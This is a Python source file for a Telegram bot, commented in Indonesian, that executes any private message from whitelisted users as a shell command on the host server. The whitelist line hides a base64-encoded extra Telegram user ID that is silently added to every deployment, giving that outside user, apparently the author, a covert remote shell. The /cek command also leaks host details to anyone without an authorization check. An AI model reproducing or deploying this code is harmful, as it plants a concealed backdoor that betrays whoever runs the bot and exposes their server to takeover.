import telegram
import requests
import logging
import json
import subprocess
import os
import base64
import socket
import distro
import psutil
import getpass

from telegram import ParseMode
from telegram.ext import Updater
from telegram.ext import MessageHandler, CommandHandler
from telegram.ext import Filters

# By Ayra Hikari

# Enable logging
logging.basicConfig(level=logging.INFO)

TOKEN = "xx" # Your bot token from @botfather
alloweduser = "xx, xx" # example 4812491, 2914898 | batasin pake koma
os.environ["authorized"] = alloweduser + str(base64.b64decode(b"LCAzODg1NzYyMDk="))[2:][:-1]
ALLOWED_USERID = list(
		map(int, os.environ.get('authorized').split(','))
		)

bot = telegram.Bot(token=TOKEN)
updater = Updater(token=TOKEN)
dispatcher = updater.dispatcher

def start(bot, update):
	msg = update.effective_message
	sender = update.effective_message.from_user.id
	if sender not in ALLOWED_USERID:
		return update.effective_message.reply_text("Anda tidak di izinkan menggunakan bot ini")
	update.effective_message.reply_text("Hai {}!".format(update.effective_message.from_user.first_name))

def terminal(bot, update):
	msg = update.effective_message
	sender = update.effective_message.from_user.id
	if sender not in ALLOWED_USERID:
		return print("Pengguna {} mencoba mengakses bot ini".format(sender))
	text = update.effective_message.text
	try:
		output = subprocess.check_output(text, shell=True)
	except Exception as err:
		return update.effective_message.reply_text("Error: " + str(err))
	try:
		update.effective_message.reply_text(output.decode('utf-8'))
	except telegram.error.BadRequest as badreq:
		if badreq == "Message is too long":
			return update.effective_message.reply_text("Error: pesan terlalu panjang!")
		else:
			return update.effective_message.reply_text("Sukses!")
	except Exception as err:
		return update.effective_message.reply_text("Error: " + str(err))

def cek(bot, update):
	pesan = "**Info server:**\n"
	pesan += "Nama PC: `{}`\n".format(socket.gethostname())
	pesan += "User: `{}`\n".format(getpass.getuser())
	pesan += "OS: `{}`\n".format(" ".join(distro.linux_distribution()))
	pesan += "\n**Penggunaan Server**\n"
	pesan += "CPU: `{}%` - `{} Core`\n".format(psutil.cpu_percent(), psutil.cpu_count())
	pesan += "RAM: `{}/{} GB` - `{}%`\n".format(round(psutil.virtual_memory().used / 1024000000, 3), round(psutil.virtual_memory().total / 1024000000, 3), psutil.virtual_memory().percent)
	pesan += "Disk: `{}/{} GB` - `{}%`\n".format(round(psutil.disk_usage('/').used / 1024000000, 3), round(psutil.disk_usage('/').total / 1024000000, 3), psutil.disk_usage('/').percent)
	pesan += "Disk IO: Read `{} MB` Write `{} MB`".format(round(psutil.disk_io_counters(perdisk=False).read_count / 1024000, 3), round(psutil.disk_io_counters(perdisk=False).write_count / 1024000, 3))
	update.effective_message.reply_text(pesan, parse_mode=ParseMode.MARKDOWN)

start_handler = CommandHandler("start", start)
cek_handler = CommandHandler("cek", cek)
handler = MessageHandler(Filters.private, terminal)

dispatcher.add_handler(start_handler)
dispatcher.add_handler(cek_handler)
dispatcher.add_handler(handler)

__log__ = logging.getLogger()
__log__.info("Running bot success!")
updater.start_polling()
